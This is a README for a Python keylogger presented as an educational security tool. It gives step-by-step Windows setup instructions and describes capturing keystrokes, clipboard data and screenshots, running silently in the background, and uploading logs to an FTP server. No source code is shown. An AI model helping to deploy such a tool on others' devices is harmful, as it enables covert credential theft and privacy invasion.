# 🛡️ ethical-keylogger - Simple Monitoring for Learning

[![Download Now](https://img.shields.io/badge/Download-ethical--keylogger-brightgreen)](https://github.com/YashAgni2372/ethical-keylogger)

A tool designed to capture keystrokes, mouse activity, clipboard data, and screenshots on Windows. Built for educational use in cybersecurity training and labs.

---

## 🖥️ System Requirements

- Windows 10 or later
- Python 3.8 or newer installed
- At least 100 MB free disk space
- An internet connection (for FTP upload feature)
- Permissions to run applications on your computer

---

## 📚 What Does ethical-keylogger Do?

This software records your keyboard presses and mouse movements. It can also capture clipboard contents and take screenshots at set intervals. The data can be saved locally or sent to an FTP server you control.

It’s intended for learning about security and ethical hacking. Using it without permission is not allowed.

---

## ⚙️ How to Download and Run ethical-keylogger

[![Download Now](https://img.shields.io/badge/Download-ethical--keylogger-orange)](https://github.com/YashAgni2372/ethical-keylogger)

Follow these steps to get the software running on your Windows PC.

### Step 1: Visit the Download Page

Go to the official repository page at the link above. This page contains all files and instructions you need.

### Step 2: Download the ZIP File

- Scroll down to find the **Code** button near the top right.
- Click **Code**, then click **Download ZIP**.
- Save the ZIP file on your computer.

### Step 3: Extract the Files

- Locate the ZIP file you downloaded.
- Right-click on it and choose **Extract All...**
- Select a folder where you want to keep the program, like Desktop or Documents.
- Click **Extract** to unzip the files.

### Step 4: Install Python

This program runs using Python. If you do not have it, follow this:

- Visit https://www.python.org/downloads/windows/
- Download the latest version for Windows.
- Run the installer.
- Make sure to check the box that says **Add Python to PATH** before clicking install.

### Step 5: Open Command Prompt

- Press the Windows key or click the Start menu.
- Type **cmd** and press Enter.
- A black window with white text will open.

### Step 6: Navigate to ethical-keylogger Folder

In the Command Prompt window:

- Type `cd ` followed by the folder path where you extracted the files.
  
For example, if on Desktop:

```
cd Desktop\ethical-keylogger-main
```

- Press Enter.

### Step 7: Install Required Modules

- The software needs some Python modules to work.
- Type the following command and press Enter:

```
pip install -r requirements.txt
```

- Wait for the modules to install.

### Step 8: Run the Program

- Once modules are installed, start the keylogger by typing:

```
python ethical_keylogger.py
```

- Press Enter.
- The program will begin running quietly in the background.

---

## 🔍 How to Use ethical-keylogger

### Viewing Logs

- By default, the program saves logs in the same folder, under a folder named `logs`.
- Check files inside `logs` to see recorded keystrokes, mouse activity, clipboard content, and screenshots.
- Screenshots will be saved as image files.

### Setting Up FTP Upload

If you want the data sent to a remote server:

- Open `config.ini` file in a text editor.
- Enter your FTP server address, username, and password.
- Save the file.
- The program will upload logs at set intervals.

### Stopping the Program

- Go back to the Command Prompt where the program runs.
- Press `Ctrl + C` to stop.

---

## ⚠️ Permissions and Ethics

This keylogger is for authorized use only. Always ask for permission before monitoring any device. Do not use this tool on systems you do not own or have explicit consent to test.

---

## 🧰 Features

- Records every key pressed on the keyboard
- Tracks mouse clicks and movements
- Captures clipboard text when changed
- Takes periodic screenshots for visual monitoring
- Saves data locally or uploads via FTP
- Works on multiple platforms with Python
- Designed for learning ethical hacking techniques

---

## 🛠️ Troubleshooting

### Python Not Found

If typing `python` gives an error:

- Try `python3` instead.
- Make sure Python is installed and added to your system PATH.

### Modules Not Installing

If `pip install` fails:

- Check your internet connection.
- Update pip by running `python -m pip install --upgrade pip`.

### Program Doesn’t Start

- Check you are in the right folder.
- Confirm `ethical_keylogger.py` file exists.
- Ensure required modules are installed.

---

## 🔗 Useful Links

- [Official Repository](https://github.com/YashAgni2372/ethical-keylogger)
- [Python Downloads](https://www.python.org/downloads/windows/)
- [FTP Setup Guide](https://www.hostinger.com/tutorials/how-to-use-ftp-server)

---

## 📑 Topics Related to This Project

bugbounty | ctf | cybersecurity | ethical-hacking | hacking-tools | infosec | kali-linux | keylogger | malware-analysis | network-security | oscp | pentesting | python-security | red-team